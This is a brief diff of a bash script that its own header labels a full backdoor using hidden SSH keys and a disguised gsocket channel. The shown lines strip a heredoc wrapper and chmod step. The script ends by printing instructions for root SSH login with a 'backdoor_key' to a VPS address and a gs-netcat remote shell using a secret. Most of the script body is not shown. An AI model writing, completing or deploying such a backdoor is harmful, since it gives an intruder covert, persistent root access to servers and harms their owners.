@@ -1,4 +1,3 @@
-cat << 'EOF' > /root/ssh-gsocket
 #!/bin/bash
 # ============================================================
 # FULL BACKDOOR - HIDDEN SSH KEYS + GSOCKET TERSAMAR
@@ -170,5 +169,3 @@ echo " CONNECT:"
 echo "  SSH   : ssh -i backdoor_key root@$VPS_IP"
 echo "  Gsock : gs-netcat -s $GSOCKET_SECRET -i"
 echo "=========================================="
-EOF
-chmod +x /root/ssh-gsocket
